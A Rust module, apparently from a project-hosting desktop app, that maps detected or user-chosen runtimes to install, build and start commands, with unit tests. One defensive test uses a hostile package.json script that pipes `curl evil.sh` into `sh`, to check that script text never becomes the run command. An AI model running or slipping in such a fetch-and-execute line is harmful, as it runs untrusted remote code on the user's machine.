//! Deciding how a project should be built.
//!
//! Detection proposes; this module decides. It is the only place that turns a
//! [`Detection`] — or a runtime the user named — into the [`RuntimeSpec`] that
//! goes into the database, and it lives here rather than in the desktop shell so
//! that the mapping can be tested without a window.
//!
//! The defaults below are inline for the same reason
//! `apps/desktop/src-tauri/src/lib.rs` had them inline before: the template
//! manifests in `docker/templates/` are not deployed alongside the binary yet,
//! and a wrong path here would fail at the moment a user pressed Create rather
//! than at build time. When the installer ships the manifests, this table is
//! replaced by reading them — and the shape of what it returns does not change.

use std::path::Path;

use project_host_api_types::ProjectType;
use project_host_database::projects::{NewProcess, RuntimeSpec};
use project_host_project_manager::detection::{self, Detection, Runtime};

/// What to build, and what we are basing that on.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RuntimePlan {
    pub spec: RuntimeSpec,
    /// What the project runs. One process for every runtime this build plans
    /// for; detecting a genuine multi-process project is a later change
    /// against a data model that, after this one, exists.
    pub processes: Vec<NewProcess>,
    /// The port the project listens on. Not part of `RuntimeSpec` because a
    /// port is a network fact, not a runtime one.
    pub port: i64,
    /// True when the runtime came from looking at the files rather than from the
    /// user naming it.
    pub detected: bool,
    /// The coarse category for `projects.project_type`, decided here because
    /// this is where the runtime is decided. The desktop used to invent this
    /// value at the call site and got it wrong — see [`project_type_for`].
    pub project_type: ProjectType,
    /// Every language the tree showed evidence of, for the interface to report.
    pub languages: Vec<String>,
    /// Detection warnings, in the words the user should see.
    pub notes: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum PlanError {
    /// Nothing in the tree identifies a language, and the user named none
    /// either. The message is detection's own, which says what was looked for.
    #[error("{0}")]
    Undetermined(String),
    #[error("`{0}` is not a runtime this build offers")]
    UnknownRuntime(String),
}

/// Every runtime this build can plan for, as wire values, for the interface's
/// override list.
pub fn supported_runtimes() -> Vec<(&'static str, &'static str)> {
    Runtime::ALL
        .iter()
        .map(|runtime| (runtime.as_str(), runtime.display_name()))
        .collect()
}

/// Plan from an explicit choice, ignoring whatever is on disk.
///
/// What an empty project uses: there are no files to look at, so a choice is the
/// only thing available.
pub fn plan_named(runtime: &str) -> Result<RuntimePlan, PlanError> {
    let runtime = Runtime::ALL
        .iter()
        .copied()
        .find(|candidate| candidate.as_str() == runtime)
        .ok_or_else(|| PlanError::UnknownRuntime(runtime.to_string()))?;

    let (spec, process, port) = defaults_for(runtime);
    Ok(RuntimePlan {
        spec,
        processes: vec![process],
        port,
        detected: false,
        project_type: project_type_for(runtime),
        languages: vec![runtime.display_name().to_string()],
        notes: Vec::new(),
    })
}

/// Plan by looking at the files.
///
/// `override_runtime` wins when present — a user who disagrees with detection is
/// not argued with — but the detection notes are still reported, because
/// "TypeScript is present and there is no build script" is worth saying even to
/// someone who chose Node deliberately.
pub fn plan_detected(
    directory: &Path,
    override_runtime: Option<&str>,
) -> Result<RuntimePlan, PlanError> {
    let detection = detection::detect(directory);
    let languages: Vec<String> = detection::signals(directory)
        .iter()
        .map(|runtime| runtime.display_name().to_string())
        .collect();

    let notes: Vec<String> = detection
        .warnings
        .iter()
        .map(|warning| warning.message.clone())
        .collect();

    if let Some(named) = override_runtime {
        let mut plan = plan_named(named)?;
        plan.languages = languages;
        plan.notes = notes;
        return Ok(plan);
    }

    // Detection failing is not a bug to be papered over with a default. A
    // project built as the wrong runtime produces a container that exits
    // immediately, and the message here says exactly what was looked for.
    if let Some(error) = detection.errors.first() {
        return Err(PlanError::Undetermined(error.message.clone()));
    }

    let (mut spec, mut process, port) = defaults_for(detection.runtime);
    apply(&mut spec, &mut process, &detection);

    Ok(RuntimePlan {
        spec,
        processes: vec![process],
        port,
        detected: true,
        project_type: project_type_for(detection.runtime),
        languages,
        notes,
    })
}

/// Overlay what detection actually found onto the runtime's defaults.
///
/// Only fields detection has real evidence for. A suggested start command found
/// in `package.json` beats the default; a `None` leaves the default alone rather
/// than blanking a value the template needs.
fn apply(spec: &mut RuntimeSpec, process: &mut NewProcess, detection: &Detection) {
    spec.package_manager = detection.package_manager.as_str().to_string();

    if let Some(start) = &detection.suggested_start {
        // A bare script name means "run it with the package manager"; anything
        // with a space is already a command.
        process.command = if detection.scripts.contains_key(start) {
            run_script(&spec.package_manager, start)
        } else {
            start.clone()
        };
    }

    if let Some(build) = &detection.suggested_build_command {
        process.build_command = Some(if detection.scripts.contains_key(build) {
            run_script(&spec.package_manager, build)
        } else {
            build.clone()
        });
    }

    if detection.suggested_entry_file.is_some() {
        spec.entry_file = detection.suggested_entry_file.clone();
    }
    if detection.suggested_publish_dir.is_some() {
        spec.publish_dir = detection.suggested_publish_dir.clone();
    }

    // The install command depends on the manager *and* on whether the project
    // pinned its dependencies: `npm ci` requires a lockfile and fails without
    // one, which is a confusing first build for someone who just cloned a
    // repository that has none.
    process.install_command = install_command(&spec.package_manager, detection.has_lockfile);
}

/// `<manager> run <script>`, built from parts rather than concatenated from user
/// text — the same rule the template manifests enforce.
fn run_script(manager: &str, script: &str) -> String {
    match manager {
        "PNPM" => format!("pnpm run {script}"),
        "YARN" => format!("yarn run {script}"),
        "BUN" => format!("bun run {script}"),
        "DENO" => format!("deno task {script}"),
        _ => format!("npm run {script}"),
    }
}

/// What installs dependencies, given a manager and whether there is a lockfile.
fn install_command(manager: &str, has_lockfile: bool) -> Option<String> {
    let command = match (manager, has_lockfile) {
        ("PNPM", true) => "pnpm install --frozen-lockfile",
        ("PNPM", false) => "pnpm install",
        ("NPM", true) => "npm ci",
        ("NPM", false) => "npm install",
        ("YARN", true) => "yarn install --frozen-lockfile",
        ("YARN", false) => "yarn install",
        ("BUN", true) => "bun install --frozen-lockfile",
        ("BUN", false) => "bun install",
        // Deno resolves imports as it runs; there is nothing to install ahead of
        // time beyond warming the cache, which the template does.
        ("DENO", _) => return None,
        ("PIP", _) => "pip install --no-cache-dir -r requirements.txt",
        ("POETRY", _) => "poetry install --no-root --only main",
        ("UV", _) => "uv sync --frozen",
        ("PIPENV", _) => "pipenv install --deploy",
        ("GO_MODULES", _) => "go mod download",
        ("CARGO", _) => "cargo fetch --locked",
        ("MAVEN", _) => "mvn -B dependency:go-offline",
        ("GRADLE", _) => "gradle --no-daemon dependencies",
        ("COMPOSER", true) => "composer install --no-dev --no-interaction",
        ("COMPOSER", false) => "composer update --no-dev --no-interaction",
        ("BUNDLER", _) => "bundle install --without development test",
        ("NUGET", _) => "dotnet restore",
        _ => return None,
    };
    Some(command.to_string())
}

/// The defaults for one runtime: version, commands, working directory, port.
///
/// Every value is a constant in this file. None of it comes from the project
/// being built, which is what keeps a hostile repository from choosing the
/// command that runs it.
fn defaults_for(runtime: Runtime) -> (RuntimeSpec, NewProcess, i64) {
    // (version, manager, install, build, start, entry, publish, port)
    let (version, manager, install, build, start, entry, publish, port) = match runtime {
        Runtime::NodeJs => (
            "22",
            "NPM",
            Some("npm ci --omit=dev"),
            None,
            "node index.js",
            Some("index.js"),
            None,
            3000,
        ),
        Runtime::TypeScript => (
            "22",
            "NPM",
            Some("npm ci"),
            Some("npm run build"),
            "node dist/index.js",
            Some("src/index.ts"),
            Some("dist"),
            3000,
        ),
        Runtime::Bun => (
            "1",
            "BUN",
            Some("bun install --frozen-lockfile"),
            None,
            "bun run index.ts",
            Some("index.ts"),
            None,
            3000,
        ),
        Runtime::Deno => (
            "2",
            "DENO",
            None,
            None,
            "deno run --allow-net --allow-env main.ts",
            Some("main.ts"),
            None,
            8000,
        ),
        Runtime::Python => (
            "3.12",
            "PIP",
            Some("pip install --no-cache-dir -r requirements.txt"),
            None,
            "python main.py",
            Some("main.py"),
            None,
            8000,
        ),
        // Builds into the project's own directory, and starts what it built.
        // `/app` was the path inside the image; there is no such directory on
        // the host, so the old plan could not build or start on any machine.
        Runtime::Go => (
            "1.23",
            "GO_MODULES",
            Some("go mod download"),
            Some("go build -o server ./..."),
            "./server",
            Some("main.go"),
            None,
            8080,
        ),
        // `cargo run` rather than a path to a binary: the binary is named after
        // the crate, which is not knowable when the project is planned. The
        // build has already run by then, so this compiles nothing and starts
        // the same artefact.
        Runtime::Rust => (
            "1.83",
            "CARGO",
            Some("cargo fetch --locked"),
            Some("cargo build --release --locked"),
            "cargo run --release --locked",
            Some("src/main.rs"),
            None,
            8080,
        ),
        // Maven names the jar after the artefact and its version, neither of
        // which is knowable here, so this is a guess the user is expected to
        // correct — but a guess about a path on the host, which `/app/app.jar`
        // never was.
        Runtime::Java => (
            "21",
            "MAVEN",
            Some("mvn -B dependency:go-offline"),
            Some("mvn -B -DskipTests package"),
            "java -jar target/app.jar",
            Some("pom.xml"),
            None,
            8080,
        ),
        Runtime::Php => (
            "8.3",
            "COMPOSER",
            Some("composer install --no-dev --no-interaction"),
            None,
            "php -S 0.0.0.0:8080 -t .",
            Some("index.php"),
            None,
            8080,
        ),
        Runtime::Ruby => (
            "3.3",
            "BUNDLER",
            Some("bundle install --without development test"),
            None,
            "bundle exec rackup --host 0.0.0.0 --port 8080",
            Some("config.ru"),
            None,
            8080,
        ),
        Runtime::DotNet => (
            "8.0",
            "NUGET",
            Some("dotnet restore"),
            Some("dotnet publish -c Release -o publish"),
            "dotnet publish/app.dll",
            None,
            None,
            8080,
        ),
        // The start command is never run for a static site: this application
        // serves it. The value is what the interface shows, so it says what
        // actually happens rather than naming a web server nobody installed.
        Runtime::Static => (
            "1",
            "NONE",
            None,
            None,
            "serve the published directory",
            None,
            Some("public"),
            8080,
        ),
        // No install and no start: a polyglot image cannot guess which of several
        // toolchains owns the project, so both come from detection or the user.
        Runtime::Polyglot => ("1", "NONE", None, None, "./start.sh", None, None, 8080),
    };

    let spec = RuntimeSpec {
        runtime: runtime.as_str().to_string(),
        runtime_version: version.to_string(),
        package_manager: manager.to_string(),
        entry_file: entry.map(str::to_string),
        publish_dir: publish.map(str::to_string),
        template_id: runtime.as_str().to_ascii_lowercase(),
    };

    // One process, named `main`. Every runtime this build plans for is a
    // single-process project until somebody says otherwise, and `main` is the
    // name migration 0009 gave every project that existed before processes
    // did — so a planned project and an upgraded one look the same.
    let mut process = NewProcess::simple("main", 0, start);
    process.install_command = install.map(str::to_string);
    process.build_command = build.map(str::to_string);

    (spec, process, port)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn project(files: &[(&str, &str)]) -> tempfile::TempDir {
        let directory = tempfile::tempdir().expect("temp dir");
        for (path, contents) in files {
            let full = directory.path().join(path);
            if let Some(parent) = full.parent() {
                std::fs::create_dir_all(parent).expect("create parent");
            }
            std::fs::write(full, contents).expect("write");
        }
        directory
    }

    #[test]
    fn every_runtime_can_be_planned_by_name() {
        // The list the interface offers and the list this can plan for must be
        // the same list, or a user picks something that fails on Create.
        for (wire, _) in supported_runtimes() {
            let plan = plan_named(wire).unwrap_or_else(|error| panic!("{wire}: {error}"));
            assert_eq!(plan.spec.runtime, wire);
            assert!(
                !plan.processes[0].command.is_empty(),
                "{wire} has no start command"
            );
            assert!(plan.port > 0, "{wire} has no port");
            assert!(!plan.detected, "a named runtime is not a detected one");
        }
    }

    #[test]
    fn an_unknown_runtime_is_refused() {
        assert_eq!(
            plan_named("COBOL"),
            Err(PlanError::UnknownRuntime("COBOL".to_string()))
        );
    }

    #[test]
    fn a_go_project_is_planned_from_its_files() {
        let dir = project(&[
            ("go.mod", "module example.com/cli\n"),
            ("go.sum", ""),
            ("main.go", ""),
        ]);
        let plan = plan_detected(dir.path(), None).expect("planned");

        assert!(plan.detected);
        assert_eq!(plan.spec.runtime, "GO");
        assert_eq!(plan.languages, vec!["Go".to_string()]);
        assert_eq!(
            plan.processes[0].build_command.as_deref(),
            Some("go build -o server ./...")
        );
        assert_eq!(plan.processes[0].command, "./server");
    }

    #[test]
    fn no_planned_command_names_a_path_inside_an_image() {
        // `/app` was the working directory of the container image every project
        // used to be built into. Nothing runs in an image now, and no host has
        // that directory, so a plan that still names it cannot build or start
        // on any machine. Checked for every runtime rather than the three that
        // were found wrong, because the next one added would be found the same
        // way — by a user, on Create.
        for (wire, _) in supported_runtimes() {
            let plan = plan_named(wire).unwrap_or_else(|error| panic!("{wire}: {error}"));
            for process in &plan.processes {
                for (label, command) in [
                    ("start", Some(process.command.clone())),
                    ("install", process.install_command.clone()),
                    ("build", process.build_command.clone()),
                ] {
                    let Some(command) = command else { continue };
                    // By word, and only where the word *begins* `/app`. A
                    // substring search calls `target/app.jar` a container path,
                    // which is the opposite of the point.
                    for word in command.split_whitespace() {
                        assert!(
                            !word.starts_with("/app"),
                            "{wire}'s {label} command names a container path: {command}"
                        );
                    }
                }
            }
        }
    }

    #[test]
    fn a_node_projects_start_script_becomes_a_manager_command() {
        // `"start"` is a script name, not a command. Running it verbatim would
        // try to execute a program called `start`.
        let dir = project(&[
            ("package.json", r#"{"scripts":{"start":"node server.js"}}"#),
            ("package-lock.json", ""),
        ]);
        let plan = plan_detected(dir.path(), None).expect("planned");

        assert_eq!(plan.spec.runtime, "NODEJS");
        assert_eq!(plan.spec.package_manager, "NPM");
        assert_eq!(plan.processes[0].command, "npm run start");
        assert_eq!(plan.processes[0].install_command.as_deref(), Some("npm ci"));
    }

    #[test]
    fn a_project_with_no_lockfile_gets_an_install_command_that_works_without_one() {
        // `npm ci` fails outright when there is no lockfile, which is a baffling
        // first build for someone who just cloned a repository that has none.
        let dir = project(&[("package.json", r#"{"scripts":{"start":"node s.js"}}"#)]);
        let plan = plan_detected(dir.path(), None).expect("planned");
        assert_eq!(
            plan.processes[0].install_command.as_deref(),
            Some("pnpm install")
        );
    }

    #[test]
    fn a_named_runtime_overrides_detection_but_keeps_its_advice() {
        // Someone who chooses Node for a TypeScript tree is not argued with, but
        // still hears that there is no build script.
        let dir = project(&[
            ("package.json", r#"{"scripts":{"start":"node dist/i.js"}}"#),
            ("tsconfig.json", "{}"),
        ]);
        let plan = plan_detected(dir.path(), Some("NODEJS")).expect("planned");

        assert_eq!(plan.spec.runtime, "NODEJS");
        assert!(!plan.detected);
        assert_eq!(plan.languages, vec!["TypeScript".to_string()]);
        assert!(
            plan.notes.iter().any(|note| note.contains("tsconfig.json")),
            "{:?}",
            plan.notes
        );
    }

    #[test]
    fn a_tree_with_several_languages_is_planned_as_polyglot() {
        let dir = project(&[
            ("package.json", r#"{"scripts":{"start":"node server.js"}}"#),
            ("requirements.txt", "flask==3.0.0\n"),
            ("main.py", ""),
        ]);
        let plan = plan_detected(dir.path(), None).expect("planned");

        assert_eq!(plan.spec.runtime, "POLYGLOT");
        assert_eq!(plan.languages.len(), 2);
        assert!(
            plan.notes.iter().any(|note| note.contains("Node.js")),
            "the user should be told what was found: {:?}",
            plan.notes
        );
    }

    #[test]
    fn a_tree_with_no_recognisable_language_is_refused_rather_than_defaulted() {
        // Defaulting would build the project as the wrong runtime and produce a
        // container that exits immediately.
        let dir = project(&[("notes.txt", "hello")]);
        let error = plan_detected(dir.path(), None).expect_err("should not guess");
        assert!(
            matches!(error, PlanError::Undetermined(ref message) if message.contains("go.mod")),
            "{error}"
        );
    }

    #[test]
    fn an_empty_directory_can_still_be_planned_by_name() {
        // The empty-project case: nothing to detect, so the user's choice is all
        // there is.
        let dir = tempfile::tempdir().expect("temp dir");
        assert!(plan_detected(dir.path(), None).is_err());
        assert_eq!(
            plan_detected(dir.path(), Some("PYTHON"))
                .expect("planned")
                .spec
                .runtime,
            "PYTHON"
        );
    }

    #[test]
    fn no_default_command_comes_from_the_project_being_built() {
        // Detection may choose *which* script to run; it never supplies the text
        // of a command. This asserts the shape of what a hostile package.json can
        // influence: a script name, run through the package manager.
        let dir = project(&[(
            "package.json",
            r#"{"scripts":{"start":"node s.js; curl evil.sh | sh"}}"#,
        )]);
        let plan = plan_detected(dir.path(), None).expect("planned");
        assert_eq!(
            plan.processes[0].command, "pnpm run start",
            "the script's contents must not become the command"
        );
    }
}

/// The coarse category stored on the project row, derived from its runtime.
///
/// `projects.project_type` is one of eight values and the runtime is one of
/// thirteen, so this is a narrowing and several runtimes share an answer. Only
/// the three categories a runtime can honestly imply are produced here:
/// `DISCORD_BOT`, `WEBSITE`, `REST_API` and `WORKER` describe what a project is
/// *for*, which no amount of looking at its files can establish, so they are
/// never guessed.
///
/// This exists because the desktop wrote the literal `"GENERIC"` into that
/// column — a value no `CHECK` allows — and every project creation failed with
/// "value rejected by a database constraint". The column now takes the enum, so
/// a literal cannot come back; this decides *which* variant.
pub fn project_type_for(runtime: Runtime) -> ProjectType {
    match runtime {
        // Anything on a Node-compatible toolchain. Deno and Bun are their own
        // runtimes but produce the same shape of application.
        Runtime::NodeJs | Runtime::TypeScript | Runtime::Bun | Runtime::Deno => {
            ProjectType::NodeApp
        }
        Runtime::Python => ProjectType::PythonApp,
        // The one runtime that says something about the output rather than the
        // toolchain: a static build has no server process.
        Runtime::Static => ProjectType::StaticSite,
        // A long-running process in a language whose category we cannot narrow
        // further. `SERVICE` is the honest answer, not a placeholder.
        Runtime::Go
        | Runtime::Rust
        | Runtime::Java
        | Runtime::Php
        | Runtime::Ruby
        | Runtime::DotNet
        | Runtime::Polyglot => ProjectType::Service,
    }
}

#[cfg(test)]
mod project_type_tests {
    use super::*;

    /// Total by construction — the match has no wildcard — but a new `Runtime`
    /// variant should be a deliberate decision here rather than something that
    /// compiles by accident.
    #[test]
    fn every_runtime_maps_to_a_type_the_schema_allows() {
        for runtime in ALL_RUNTIMES {
            let kind = project_type_for(runtime);
            assert!(
                ProjectType::ALL.contains(&kind),
                "{runtime:?} mapped to {}, which is not a ProjectType",
                kind.as_str()
            );
        }
    }

    /// The value that caused the defect. No runtime may produce anything
    /// outside the eight the constraint lists.
    #[test]
    fn no_runtime_produces_a_value_outside_the_constraint() {
        const ALLOWED: [&str; 8] = [
            "DISCORD_BOT",
            "NODE_APP",
            "PYTHON_APP",
            "WEBSITE",
            "STATIC_SITE",
            "REST_API",
            "WORKER",
            "SERVICE",
        ];

        for runtime in ALL_RUNTIMES {
            let written = project_type_for(runtime).as_str();
            assert!(
                ALLOWED.contains(&written),
                "{runtime:?} would write {written}, which the CHECK refuses"
            );
        }
    }

    #[test]
    fn the_node_family_shares_one_category() {
        for runtime in [
            Runtime::NodeJs,
            Runtime::TypeScript,
            Runtime::Bun,
            Runtime::Deno,
        ] {
            assert_eq!(project_type_for(runtime), ProjectType::NodeApp);
        }
    }

    #[test]
    fn a_static_build_is_not_a_service() {
        assert_eq!(project_type_for(Runtime::Static), ProjectType::StaticSite);
        assert_eq!(project_type_for(Runtime::Go), ProjectType::Service);
    }

    const ALL_RUNTIMES: [Runtime; 13] = [
        Runtime::NodeJs,
        Runtime::TypeScript,
        Runtime::Bun,
        Runtime::Deno,
        Runtime::Python,
        Runtime::Go,
        Runtime::Rust,
        Runtime::Java,
        Runtime::Php,
        Runtime::Ruby,
        Runtime::DotNet,
        Runtime::Static,
        Runtime::Polyglot,
    ];
}
